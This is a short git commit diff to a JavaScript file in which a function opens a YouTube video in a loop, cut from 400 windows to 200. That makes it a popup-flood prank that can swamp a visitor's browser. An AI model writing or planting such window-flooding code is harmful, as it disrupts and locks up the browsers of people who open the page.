6e85f01f980c953ef7a87eff6533695e0fd12f1e
dgonsk8 <dgongar3112@gmail.com>
2023-11-20 14:51:58 +0100

    new

--- Script/script.js
+++ Script/script.js
@@ -1,7 +1,7 @@
 function abre() {
     let c = 1000;
 
-    for (i = 0; i < 400; i++) {
+    for (i = 0; i < 200; i++) {
         window.open("https://www.youtube.com/watch?v=Da-CIlJU8I4&pp=ygUeaGFibGFtb3MgbWHDsWFuYWJhZCBidW5ueSBkdWtp",
             "ventana" + [i],
 
